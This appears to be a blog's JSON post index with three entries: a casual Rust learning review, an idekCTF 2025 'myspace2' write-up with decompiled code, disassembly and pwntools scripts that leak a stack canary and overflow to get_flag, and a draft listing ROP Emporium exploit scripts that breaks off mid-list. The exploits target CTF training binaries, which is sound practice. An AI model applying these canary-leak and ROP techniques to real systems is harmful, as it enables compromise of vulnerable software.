[{"content":"Introduction As someone who writes code primarily in Go and Python, maybe sometimes C and Java, I have never had a cult following for a language. I liked Go for its syntax, compiler, and extensive libraries and import system and Python for its simple syntax and basically the ability for it to act as both as a programming and scripting language. Everytime I learn a new language its with a certain goal in mind which is achieved by learning that language. Go for server-side apps and command line tools, Python for scientific computing and scripts\nThe main reason I don\u0026rsquo;t code in C or Java too often is because aside from FTC, I don\u0026rsquo;t really see a use in writing Java code now that AP CSA is over. As for C, I don\u0026rsquo;t trust myself to write safe code.\nLearning Rust was the first time I learned a language just to learn it because out of any programming language out there, Rust probably has one of the largest cults. I wanted to see what the hype was all about.\nI started where I think everyone starts learning Rust: https://doc.rust-lang.org/book/\nThis yap session might be like a mini version of this book\nCargo and Rustc The binary rustc was the main compiler for rust programs. The convention was pretty easy to follow. rustc main.rs and you would get a main ELF file. If you want to compile a standalone Rust program that would be done with rustc. You may think this is a Pretty standard compiler, but I actually really like rustc as a compiler because of its error messages. Whenever an error is present inside of a Rust program, not onlly is rustc able to capture it, but it gives pretty accurate and helpful suggestions for fixes which is especially useful when dealing with datatype compliance. A breath of fresh air compared to the horrendous gcc error wall.\nA lot of rustc functionality is also invoked by cargo which is the package manager. A project is likely best formatted to work with cargo if it has many dependencies which require fetching or resolving. The main file to write is Cargo.toml which stores information for your program, but also important compilation options such as whether you want to compile it to a library or a standard executable. Overall its pretty great for handling dependencies and managing your project.\ncargo new project creates a new cargo project directory\nCargo.toml\n1 2 3 4 5 6 [package] name = \u0026#34;project\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2024\u0026#34; [dependencies] Build to executable: cargo build Run program: cargo run Check if it compiles: cargo check\nVery good stuff. 9/10\nSyntax: Datatypes and Variables I am going to be very honest here syntax is probably a big part of what makes me like a programming language. More than speed or compiler and what not. I literally do not care if your language is \u0026ldquo;blazing fast\u0026rdquo;. It can have a compiler which only works online and sends the source code to some server running off 5 lemon batteries in a rural Japanese village which then sends back the executable. If it has good syntax, then I like it.\nIronically the syntax I hate the most is JavaScript which is why I have always refused to learn it. It just looks like a toy language. Maybe because it kinda is.\nI really like C and Go type syntax. Python syntax is also cool cuz Python is cool but not gonna lie I would have liked python more if I could use braces instead of indents.\nANYWAY! Rust var declaration. In Rust the simple datatypes are:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 i8 --\u0026gt; 8 bit int i16 --\u0026gt; 16 bit int (short) i32 --\u0026gt; 32 bit int (int) i64 --\u0026gt; 54 bit int (long) f32 --\u0026gt; 32 bit float f64 --\u0026gt; 64 bit float u8 --\u0026gt; unsigned 8 bit int u16 --\u0026gt; unsigned 16 bit int u32 --\u0026gt; unsigned 32 bit int u64 --\u0026gt; unsigned 64 bit int bool --\u0026gt; booll char --\u0026gt; single unicode scalar value I think you see a pattern here. Rust is very slang when it comes to its datatypes which I think is pretty tuff. Like they way it calls stuff i64 and f32 is just kinda tuff right off the bat. Already some consistency here.\nRust also has type inference. So you can do stuff like this:\n1 2 3 4 fn ret_one() -\u0026gt; i32 { let n = 1; return n; } and it will automatically treat 1 as an i32.\n","date":"2025-08-07T00:00:00Z","image":"https://shuban-789.github.io/p/coding-rust/cover_hu_5385c3ab93467356.png","permalink":"https://shuban-789.github.io/p/coding-rust/","title":"i tried Rust (no i did not join the cult)"},{"content":"The rest of the idek pwn kinda hurted my brain (orz vy and nightxade) so I thought this chall might be good practice anyway to touch up on some of the basics. This is the pseudocode from ghidra which i pieced together. Its like the pseudo C ghidra has and I added some comments.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 void all_friends(char (*top_friends)[8]) { int i; puts(\u0026#34;\\nTop Friends List:\u0026#34;); for (i = 0; i \u0026lt; 8; i++) { printf(\u0026#34;%d: %s\\n\u0026#34;, i, top_friends[i]); } return; } void display_friend(char (*top_friends)[8]) { long lVar1; int iVar2; long in_FS_OFFSET; char buf[16]; lVar1 = *(long *)(in_FS_OFFSET + 0x28); puts(\u0026#34;\\nEnter index to display (0-7): \u0026#34;); fgets(buf, 0x10, stdin); iVar2 = FUN_00401160(buf); // atoi if ((iVar2 \u0026lt; 0) || (7 \u0026lt; iVar2)) { puts(\u0026#34;Invalid index!\u0026#34;); } else { write(1, top_friends[iVar2], 8); puts(\u0026#34;\u0026#34;); } if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return; } void edit_friend(char (*top_friends)[8]) { long lVar1; int iVar2; size_t sVar3; long in_FS_OFFSET; char buf[32]; lVar1 = *(long *)(in_FS_OFFSET + 0x28); puts(\u0026#34;\\nEnter index to edit (0-7): \u0026#34;); fgets(buf, 0x20, stdin); iVar2 = FUN_00401160(buf); if ((iVar2 \u0026lt; 0) || (7 \u0026lt; iVar2)) { puts(\u0026#34;Invalid index!\u0026#34;); } else { puts(\u0026#34;Enter new name: \u0026#34;); fgets(top_friends[iVar2], 0x100, stdin); sVar3 = strcspn(top_friends[iVar2], \u0026#34;\\n\u0026#34;); top_friends[iVar2][sVar3] = \u0026#39;\\0\u0026#39;; puts(\u0026#34;Friend updated.\u0026#34;); } if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return; } void get_flag(void) { long lVar1; long in_FS_OFFSET; char *args [3]; lVar1 = *(long *)(in_FS_OFFSET + 0x28); args[0] = \u0026#34;/bin/cat\u0026#34;; args[1] = \u0026#34;/flag.txt\u0026#34;; args[2] = (char *)0x0; execve(\u0026#34;/bin/cat\u0026#34;,args,(char **)0x0); if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return; } void ignore_me(void) { setbuf(stdin,(char *)0x0); setbuf(stdout,(char *)0x0); setbuf(stderr,(char *)0x0); return; } void menu(void) { puts(\u0026#34;\\n1. See Top Friends\u0026#34;); puts(\u0026#34;2. Edit Friend\u0026#34;); puts(\u0026#34;3. Display Friend\u0026#34;); puts(\u0026#34;4. Quit\u0026#34;); puts(\u0026#34;\u0026gt;\u0026gt; \u0026#34;); return; } int main(void) { long lVar1; int iVar2; long in_FS_OFFSET; char top_friends[8][8]; // 8x8 mat of chars. Each row contains up to 8 chars for the name, multiple of these rows are stored for each name. Kind of funny char buf[40]; lVar1 = *(long *)(in_FS_OFFSET + 0x28); setvbuf(stdout, (char *)0x0, 2, 0); puts(\u0026#34;I really miss MySpace. At least the part about ranking my friends. Let\u0026#39;s recreate it!\u0026#34;); builtin_strncpy(top_friends[0], \u0026#34;es3n1n\u0026#34;, 7); top_friends[0][7] = \u0026#39;\\0\u0026#39;; builtin_strncpy(top_friends[1], \u0026#34;Zero\u0026#34;, 5); top_friends[1][5] = \u0026#39;\\0\u0026#39;; top_friends[1][6] = \u0026#39;\\0\u0026#39;; top_friends[1][7] = \u0026#39;\\0\u0026#39;; builtin_strncpy(top_friends[2], \u0026#34;Contron\u0026#34;, 8); builtin_strncpy(top_friends[3], \u0026#34;mixy1\u0026#34;, 6); top_friends[3][6] = \u0026#39;\\0\u0026#39;; top_friends[3][7] = \u0026#39;\\0\u0026#39;; builtin_strncpy(top_friends[4], \u0026#34;JoshL\u0026#34;, 6); top_friends[4][6] = \u0026#39;\\0\u0026#39;; top_friends[4][7] = \u0026#39;\\0\u0026#39;; builtin_strncpy(top_friends[5], \u0026#34;Giapppp\u0026#34;, 8); builtin_strncpy(top_friends[6], \u0026#34;Icesfont\u0026#34;, 8); builtin_strncpy(top_friends[7], \u0026#34;arcticx\u0026#34;, 8); LAB_00401636: // main menu routine menu(); fgets(buf, 0x28, stdin); iVar2 = FUN_00401160(buf); if (iVar2 == 4) { if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) { return 0; } __stack_chk_fail(); } if (iVar2 \u0026lt; 5) { if (iVar2 == 3) { display_friend(top_friends); goto LAB_00401636; } if (iVar2 \u0026lt; 4) { if (iVar2 == 1) { all_friends(top_friends); } else { if (iVar2 != 2) goto LAB_004016cd; edit_friend(top_friends); } goto LAB_00401636; } } LAB_004016cd: puts(\u0026#34;Invalid option.\u0026#34;); goto LAB_00401636; } interesting things to note:\nthe character count check is absolutely useless for options 2 and 3. The logic gate ((iVar2 \u0026lt; 0) || (7 \u0026lt; iVar2)) does technically work as control flow so this is very confusing I look at the disassembly of the edit_friend function, i see:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 Dump of assembler code for function display_friend: 0x00000000004014d7 \u0026lt;+0\u0026gt;: endbr64 0x00000000004014db \u0026lt;+4\u0026gt;: push rbp 0x00000000004014dc \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000004014df \u0026lt;+8\u0026gt;: sub rsp,0x40 0x00000000004014e3 \u0026lt;+12\u0026gt;: mov QWORD PTR [rbp-0x38],rdi 0x00000000004014e7 \u0026lt;+16\u0026gt;: mov rax,QWORD PTR fs:0x28 0x00000000004014f0 \u0026lt;+25\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x00000000004014f4 \u0026lt;+29\u0026gt;: xor eax,eax 0x00000000004014f6 \u0026lt;+31\u0026gt;: lea rax,[rip+0xbcb] # 0x4020c8 0x00000000004014fd \u0026lt;+38\u0026gt;: mov rdi,rax 0x0000000000401500 \u0026lt;+41\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x0000000000401505 \u0026lt;+46\u0026gt;: mov rdx,QWORD PTR [rip+0x2b64] # 0x404070 \u0026lt;stdin@GLIBC_2.2.5\u0026gt; 0x000000000040150c \u0026lt;+53\u0026gt;: lea rax,[rbp-0x20] 0x0000000000401510 \u0026lt;+57\u0026gt;: mov esi,0x10 0x0000000000401515 \u0026lt;+62\u0026gt;: mov rdi,rax 0x0000000000401518 \u0026lt;+65\u0026gt;: call 0x401130 \u0026lt;fgets@plt\u0026gt; 0x000000000040151d \u0026lt;+70\u0026gt;: lea rax,[rbp-0x20] 0x0000000000401521 \u0026lt;+74\u0026gt;: mov rdi,rax 0x0000000000401524 \u0026lt;+77\u0026gt;: call 0x401160 \u0026lt;atoi@plt\u0026gt; 0x0000000000401529 \u0026lt;+82\u0026gt;: mov DWORD PTR [rbp-0x24],eax 0x000000000040152c \u0026lt;+85\u0026gt;: cmp DWORD PTR [rbp-0x24],0x0 0x0000000000401530 \u0026lt;+89\u0026gt;: js 0x401538 \u0026lt;display_friend+97\u0026gt; 0x0000000000401532 \u0026lt;+91\u0026gt;: cmp DWORD PTR [rbp-0x24],0x7 0x0000000000401536 \u0026lt;+95\u0026gt;: jle 0x401547 \u0026lt;display_friend+112\u0026gt; 0x0000000000401538 \u0026lt;+97\u0026gt;: lea rax,[rip+0xb55] # 0x402094 0x000000000040153f \u0026lt;+104\u0026gt;: mov rdi,rax 0x0000000000401542 \u0026lt;+107\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x0000000000401547 \u0026lt;+112\u0026gt;: mov eax,DWORD PTR [rbp-0x24] 0x000000000040154a \u0026lt;+115\u0026gt;: cdqe 0x000000000040154c \u0026lt;+117\u0026gt;: lea rdx,[rax*8+0x0] 0x0000000000401554 \u0026lt;+125\u0026gt;: mov rax,QWORD PTR [rbp-0x38] 0x0000000000401558 \u0026lt;+129\u0026gt;: add rax,rdx 0x000000000040155b \u0026lt;+132\u0026gt;: mov edx,0x8 0x0000000000401560 \u0026lt;+137\u0026gt;: mov rsi,rax 0x0000000000401563 \u0026lt;+140\u0026gt;: mov edi,0x1 0x0000000000401568 \u0026lt;+145\u0026gt;: call 0x4010e0 \u0026lt;write@plt\u0026gt; 0x000000000040156d \u0026lt;+150\u0026gt;: nop 0x000000000040156e \u0026lt;+151\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x0000000000401572 \u0026lt;+155\u0026gt;: sub rax,QWORD PTR fs:0x28 0x000000000040157b \u0026lt;+164\u0026gt;: je 0x401582 \u0026lt;display_friend+171\u0026gt; 0x000000000040157d \u0026lt;+166\u0026gt;: call 0x4010f0 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x0000000000401582 \u0026lt;+171\u0026gt;: leave 0x0000000000401583 \u0026lt;+172\u0026gt;: ret End of assembler dump. in the assembly of the control flow here\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 0x0000000000401532 \u0026lt;+91\u0026gt;: cmp DWORD PTR [rbp-0x24],0x7 0x0000000000401536 \u0026lt;+95\u0026gt;: jle 0x401547 \u0026lt;display_friend+112\u0026gt; 0x0000000000401538 \u0026lt;+97\u0026gt;: lea rax,[rip+0xb55] # 0x402094 0x000000000040153f \u0026lt;+104\u0026gt;: mov rdi,rax 0x0000000000401542 \u0026lt;+107\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x0000000000401547 \u0026lt;+112\u0026gt;: mov eax,DWORD PTR [rbp-0x24] 0x000000000040154a \u0026lt;+115\u0026gt;: cdqe 0x000000000040154c \u0026lt;+117\u0026gt;: lea rdx,[rax*8+0x0] 0x0000000000401554 \u0026lt;+125\u0026gt;: mov rax,QWORD PTR [rbp-0x38] 0x0000000000401558 \u0026lt;+129\u0026gt;: add rax,rdx 0x000000000040155b \u0026lt;+132\u0026gt;: mov edx,0x8 0x0000000000401560 \u0026lt;+137\u0026gt;: mov rsi,rax 0x0000000000401563 \u0026lt;+140\u0026gt;: mov edi,0x1 0x0000000000401568 \u0026lt;+145\u0026gt;: call 0x4010e0 \u0026lt;write@plt\u0026gt; there is a jump for the index in range jle 0x401547 for jumping if the index is less than or equal to 7 but there is actually no jump or ret made if the index is greater\u0026hellip; meaning it still performs the stuff inside the else but with an index greater than 7. so i can write to a higher index. What this means though is that positionallly, 8x8 matrix is 64 bytes so after that, any index i choose will increase that offset by 8 bytes. Because write() has an fd to stdout, it prints the element at that position thus making a \u0026ldquo;display\u0026rdquo; feature. If i know the canary\u0026rsquo;s alignment in the stack now i can continue with the exploit. I honestly just spammed random numbers in hopes of finding a suffix which ended with 00 since thats usually the standard convention for canaries but i guess like if you look at the disassembly for main:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 Dump of assembler code for function main: 0x0000000000401584 \u0026lt;+0\u0026gt;: endbr64 0x0000000000401588 \u0026lt;+4\u0026gt;: push rbp 0x0000000000401589 \u0026lt;+5\u0026gt;: mov rbp,rsp 0x000000000040158c \u0026lt;+8\u0026gt;: add rsp,0xffffffffffffff80 0x0000000000401590 \u0026lt;+12\u0026gt;: mov rax,QWORD PTR fs:0x28 0x0000000000401599 \u0026lt;+21\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x000000000040159d \u0026lt;+25\u0026gt;: xor eax,eax 0x000000000040159f \u0026lt;+27\u0026gt;: mov rax,QWORD PTR [rip+0x2aba] # 0x404060 \u0026lt;stdout@GLIBC_2.2.5\u0026gt; 0x00000000004015a6 \u0026lt;+34\u0026gt;: mov ecx,0x0 0x00000000004015ab \u0026lt;+39\u0026gt;: mov edx,0x2 0x00000000004015b0 \u0026lt;+44\u0026gt;: mov esi,0x0 0x00000000004015b5 \u0026lt;+49\u0026gt;: mov rdi,rax 0x00000000004015b8 \u0026lt;+52\u0026gt;: call 0x401150 \u0026lt;setvbuf@plt\u0026gt; 0x00000000004015bd \u0026lt;+57\u0026gt;: lea rax,[rip+0xb24] # 0x4020e8 0x00000000004015c4 \u0026lt;+64\u0026gt;: mov rdi,rax 0x00000000004015c7 \u0026lt;+67\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x00000000004015cc \u0026lt;+72\u0026gt;: movabs rax,0x6e316e337365 0x00000000004015d6 \u0026lt;+82\u0026gt;: mov QWORD PTR [rbp-0x70],rax 0x00000000004015da \u0026lt;+86\u0026gt;: mov QWORD PTR [rbp-0x68],0x6f72655a 0x00000000004015e2 \u0026lt;+94\u0026gt;: movabs rax,0x6e6f72746e6f43 0x00000000004015ec \u0026lt;+104\u0026gt;: mov QWORD PTR [rbp-0x60],rax 0x00000000004015f0 \u0026lt;+108\u0026gt;: movabs rax,0x317978696d 0x00000000004015fa \u0026lt;+118\u0026gt;: mov QWORD PTR [rbp-0x58],rax 0x00000000004015fe \u0026lt;+122\u0026gt;: movabs rax,0x4c68736f4a 0x0000000000401608 \u0026lt;+132\u0026gt;: mov QWORD PTR [rbp-0x50],rax 0x000000000040160c \u0026lt;+136\u0026gt;: movabs rax,0x70707070616947 0x0000000000401616 \u0026lt;+146\u0026gt;: mov QWORD PTR [rbp-0x48],rax 0x000000000040161a \u0026lt;+150\u0026gt;: movabs rax,0x746e6f6673656349 0x0000000000401624 \u0026lt;+160\u0026gt;: mov QWORD PTR [rbp-0x40],rax 0x0000000000401628 \u0026lt;+164\u0026gt;: movabs rax,0x78636974637261 0x0000000000401632 \u0026lt;+174\u0026gt;: mov QWORD PTR [rbp-0x38],rax 0x0000000000401636 \u0026lt;+178\u0026gt;: mov eax,0x0 0x000000000040163b \u0026lt;+183\u0026gt;: call 0x401305 \u0026lt;menu\u0026gt; 0x0000000000401640 \u0026lt;+188\u0026gt;: mov rdx,QWORD PTR [rip+0x2a29] # 0x404070 \u0026lt;stdin@GLIBC_2.2.5\u0026gt; 0x0000000000401647 \u0026lt;+195\u0026gt;: lea rax,[rbp-0x30] 0x000000000040164b \u0026lt;+199\u0026gt;: mov esi,0x28 0x0000000000401650 \u0026lt;+204\u0026gt;: mov rdi,rax 0x0000000000401653 \u0026lt;+207\u0026gt;: call 0x401130 \u0026lt;fgets@plt\u0026gt; 0x0000000000401658 \u0026lt;+212\u0026gt;: lea rax,[rbp-0x30] 0x000000000040165c \u0026lt;+216\u0026gt;: mov rdi,rax 0x000000000040165f \u0026lt;+219\u0026gt;: call 0x401160 \u0026lt;atoi@plt\u0026gt; 0x0000000000401664 \u0026lt;+224\u0026gt;: mov DWORD PTR [rbp-0x74],eax 0x0000000000401667 \u0026lt;+227\u0026gt;: cmp DWORD PTR [rbp-0x74],0x4 0x000000000040166b \u0026lt;+231\u0026gt;: je 0x4016b7 \u0026lt;main+307\u0026gt; 0x000000000040166d \u0026lt;+233\u0026gt;: cmp DWORD PTR [rbp-0x74],0x4 0x0000000000401671 \u0026lt;+237\u0026gt;: jg 0x4016cd \u0026lt;main+329\u0026gt; 0x0000000000401673 \u0026lt;+239\u0026gt;: cmp DWORD PTR [rbp-0x74],0x3 0x0000000000401677 \u0026lt;+243\u0026gt;: je 0x4016a9 \u0026lt;main+293\u0026gt; 0x0000000000401679 \u0026lt;+245\u0026gt;: cmp DWORD PTR [rbp-0x74],0x3 0x000000000040167d \u0026lt;+249\u0026gt;: jg 0x4016cd \u0026lt;main+329\u0026gt; 0x000000000040167f \u0026lt;+251\u0026gt;: cmp DWORD PTR [rbp-0x74],0x1 0x0000000000401683 \u0026lt;+255\u0026gt;: je 0x40168d \u0026lt;main+265\u0026gt; 0x0000000000401685 \u0026lt;+257\u0026gt;: cmp DWORD PTR [rbp-0x74],0x2 0x0000000000401689 \u0026lt;+261\u0026gt;: je 0x40169b \u0026lt;main+279\u0026gt; 0x000000000040168b \u0026lt;+263\u0026gt;: jmp 0x4016cd \u0026lt;main+329\u0026gt; 0x000000000040168d \u0026lt;+265\u0026gt;: lea rax,[rbp-0x70] 0x0000000000401691 \u0026lt;+269\u0026gt;: mov rdi,rax 0x0000000000401694 \u0026lt;+272\u0026gt;: call 0x40135b \u0026lt;all_friends\u0026gt; 0x0000000000401699 \u0026lt;+277\u0026gt;: jmp 0x4016dc \u0026lt;main+344\u0026gt; 0x000000000040169b \u0026lt;+279\u0026gt;: lea rax,[rbp-0x70] 0x000000000040169f \u0026lt;+283\u0026gt;: mov rdi,rax 0x00000000004016a2 \u0026lt;+286\u0026gt;: call 0x4013be \u0026lt;edit_friend\u0026gt; 0x00000000004016a7 \u0026lt;+291\u0026gt;: jmp 0x4016dc \u0026lt;main+344\u0026gt; 0x00000000004016a9 \u0026lt;+293\u0026gt;: lea rax,[rbp-0x70] 0x00000000004016ad \u0026lt;+297\u0026gt;: mov rdi,rax 0x00000000004016b0 \u0026lt;+300\u0026gt;: call 0x4014d7 \u0026lt;display_friend\u0026gt; 0x00000000004016b5 \u0026lt;+305\u0026gt;: jmp 0x4016dc \u0026lt;main+344\u0026gt; 0x00000000004016b7 \u0026lt;+307\u0026gt;: mov eax,0x0 0x00000000004016bc \u0026lt;+312\u0026gt;: mov rdx,QWORD PTR [rbp-0x8] 0x00000000004016c0 \u0026lt;+316\u0026gt;: sub rdx,QWORD PTR fs:0x28 0x00000000004016c9 \u0026lt;+325\u0026gt;: je 0x4016e6 \u0026lt;main+354\u0026gt; 0x00000000004016cb \u0026lt;+327\u0026gt;: jmp 0x4016e1 \u0026lt;main+349\u0026gt; 0x00000000004016cd \u0026lt;+329\u0026gt;: lea rax,[rip+0xa6a] # 0x40213e 0x00000000004016d4 \u0026lt;+336\u0026gt;: mov rdi,rax 0x00000000004016d7 \u0026lt;+339\u0026gt;: call 0x4010d0 \u0026lt;puts@plt\u0026gt; 0x00000000004016dc \u0026lt;+344\u0026gt;: jmp 0x401636 \u0026lt;main+178\u0026gt; 0x00000000004016e1 \u0026lt;+349\u0026gt;: call 0x4010f0 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x00000000004016e6 \u0026lt;+354\u0026gt;: leave 0x00000000004016e7 \u0026lt;+355\u0026gt;: ret End of assembler dump. i know that the canary is likely loaded in 0x00000000004016bc \u0026lt;+312\u0026gt;: mov rdx,QWORD PTR [rbp-0x8] because right after this instruction there is a 0x00000000004016c0 \u0026lt;+316\u0026gt;: sub rdx,QWORD PTR fs:0x28 instruction and stack check fail call which happens after a comparing of values. It makes sure that the value is the same through subtracting the expected value and all. fgets() entry is at [rbp-0x30] meaning alignment wise its above the matrix. The beginning is 0x70 so the distance betwween them both is 40 but this indexing is relative to the beginning of the matrix. So its 40+64 which is 104 or basically \u0026ldquo;index 13\u0026rdquo;.\nsimple canary capture\nbasically tldr canary is a value in the stack which when overwritten makes the program just crash out. Its a security protection which is supposed to stop buffer overflow attacks this way. Alas, like many protections it gets absolutely screwed over if leaks exist.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/usr/bin/python3 from pwn import * context.arch = \u0026#34;amd64\u0026#34; context.os = \u0026#34;linux\u0026#34; elf = ELF(\u0026#39;./myspace2\u0026#39;) io = process(\u0026#39;./myspace2\u0026#39;) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) io.sendline(b\u0026#34;3\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) io.sendline(b\u0026#34;13\u0026#34;) io.recvline() io.recvline() leak = io.recvn(8) canary = u64(leak) print(f\u0026#34;canary: {hex(canary)}\u0026#34;) 1 2 3 4 5 6 7 8 9 10 11 [*] \u0026#39;/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments [+] Starting local process \u0026#39;./myspace2\u0026#39;: pid 12602 canary: 0x51426e6fa1175900 [*] Stopped process \u0026#39;./myspace2\u0026#39; (pid 12602) the 00 suffix is there so yea canary. Now i can bof in peace\nnow -\u0026gt;\ni overflow and i bypass canary theres conventiently a get_flag function. i ret to there. i exit cuz i need the ret to pop the top of the stack and jmp (top of the stack is addr of get flag) so then i can finish the final script where the last order of business was just to do a simple bof with canary alignment, and then exit to leverage ret.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python3 from pwn import * context.arch = \u0026#34;amd64\u0026#34; context.os = \u0026#34;linux\u0026#34; local = False elf = ELF(\u0026#39;./myspace2\u0026#39;) io = process(\u0026#39;./myspace2\u0026#39;) if not local: io = remote(\u0026#34;myspace2.chal.idek.team\u0026#34;, 1337) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) io.sendline(b\u0026#34;3\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) io.sendline(b\u0026#34;13\u0026#34;) io.recvline() io.recvline() leak = io.recvn(8) canary = u64(leak) print(f\u0026#34;canary: {hex(canary)}\u0026#34;) payload = b\u0026#39;A\u0026#39; * 48 + p64(canary) + b\u0026#39;B\u0026#39; * 8 payload += p64(elf.symbols[\u0026#39;get_flag\u0026#39;]) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) io.sendline(\u0026#34;2\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) io.sendline(\u0026#34;7\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) io.sendline(payload) io.sendline(b\u0026#34;4\u0026#34;) io.interactive() yay\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [*] \u0026#39;/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments [+] Starting local process \u0026#39;./myspace2\u0026#39;: pid 13557 [+] Opening connection to myspace2.chal.idek.team on port 1337: Done canary: 0xa9a39f5714d96d00 /home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/sol.py:27: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes io.sendline(\u0026#34;2\u0026#34;) /home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/sol.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes io.sendline(\u0026#34;7\u0026#34;) [*] Switching to interactive mode Friend updated. 1. See Top Friends 2. Edit Friend 3. Display Friend 4. Quit \u0026gt;\u0026gt; idek{b4bys_1st_c00k1e_leak_yayyy!} fladg\n","date":"2025-08-05T00:00:00Z","image":"https://shuban-789.github.io/p/pwn-idek/cover_hu_181657eef09be93b.png","permalink":"https://shuban-789.github.io/p/pwn-idek/","title":"myspace2 idekCTF 2025"},{"content":"not done yet :P i still need to write explanations and what not. im just going to place all the scripts i have so far here though\nChall 1: ret2win 1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./ret2win\u0026#39;) payload = b\u0026#39;A\u0026#39;*32 + b\u0026#39;B\u0026#39;*8 payload += p64(0x000000000040053e) payload += p64(0x0000000000400756) p.sendline(payload) p.interactive() Chall 2: split 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #!/usr/bin/python3 from pwn import * context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; context.bits = 64 io = process(\u0026#34;./split\u0026#34;) print(\u0026#34;connect gdb to pid %d\u0026#34; % io.pid) pause() payload = b\u0026#39;A\u0026#39;*32 + b\u0026#39;B\u0026#39;*8 cat_virtual_address = p64(0x1060 - 0x1050 + 0x601050) pop_rdi = p64(0x000000004007c3) system_plt = p64(0x000000000040074b) payload += pop_rdi + cat_virtual_address + system_plt io.sendline(payload) io.interactive() Chall 3: callme 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 from pwn import * context.bits = 64 context.os = \u0026#39;linux\u0026#39; context.arch = \u0026#39;amd64\u0026#39; debug = False p = process(\u0026#39;./callme\u0026#39;) if debug: print(\u0026#34;pid for process @ %d\u0026#34; % p.pid) pause() arg1 = p64(0xdeadbeefdeadbeef) arg2 = p64(0xcafebabecafebabe) arg3 = p64(0xd00df00dd00df00d) args = arg1 + arg2 + arg3 junk = b\u0026#39;A\u0026#39; * 32 + b\u0026#39;B\u0026#39; * 8 one = p64(0x400720) two = p64(0x400740) three = p64(0x4006f0) gadget = p64(0x40093c) payload = junk + gadget + args + one payload += gadget + args + two payload += gadget + args + three p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(payload) p.interactive() Chall 4: write4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from pwn import * p = process(\u0026#39;./write4\u0026#39;) pop_rdi = p64(0x0000000000400693) pop_r14_r15 = p64(0x0000000000400690) mov_qword_ptr = p64(0x0000000000400628) print_file_call = p64(0x0000000000400620) flag_file = p64(0x7478742e67616c66) reserved_addr_bss = p64(0x0000000000601038) payload = b\u0026#39;A\u0026#39; * 32 + b\u0026#39;B\u0026#39; * 8 # Write \u0026#34;flag.txt\u0026#34; to bss payload += pop_r14_r15 payload += reserved_addr_bss # address -\u0026gt; r14 payload += flag_file # flag.txt -\u0026gt; r15 payload += mov_qword_ptr # mov qword ptr [r14], r15 ; ret # use pop_rdi to set argument, and shove \u0026#34;flag.txt\u0026#34; into printfile call payload += pop_rdi payload += reserved_addr_bss payload += print_file_call p.sendline(payload) p.interactive() Chall 5: badchars 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 